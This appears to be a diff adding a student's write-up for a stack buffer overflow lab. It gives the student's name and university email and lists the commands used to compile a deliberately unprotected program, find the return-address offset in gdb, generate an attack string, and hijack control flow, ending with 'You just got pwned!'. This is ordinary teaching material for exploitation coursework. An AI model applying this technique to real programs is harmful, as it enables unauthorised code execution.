@@ -1,0 +1,32 @@
+NAME		: Jayanth Sivakumar
+B-NUMBER	: B00615297	
+B-MAIL		: jsivaku1@binghamton.edu
+
+The buffer overflow can be launched by checking the stack memory in gdb. The Old stack pointer's previous address is the return address to main. Replacing that with target address will launch the attack without crashing the program
+
+Then the break point in gdb will help us see the changed stack value so that we can get the offset to launch the attack. 
+
+To compile the vulnerable program-
+gcc ./vuln_program.c -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -static -o vuln -ggdb
+
+Command to check the stack contents-
+gdb vuln_program
+
+Command to compile to code generation file for overflow attack-
+gcc -std=c99 attack-string.c -o attack-string
+
+
+Command to Generate the string and appening the target address using
+./attack-string $'target address' > ./attack.input
+
+
+Now, the attack is being launched and the output is generated without crashing the application.
+./vuln_program < ./attack.input
+
+Output will be:
+You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAy
+You just got pwned!
+
+
+
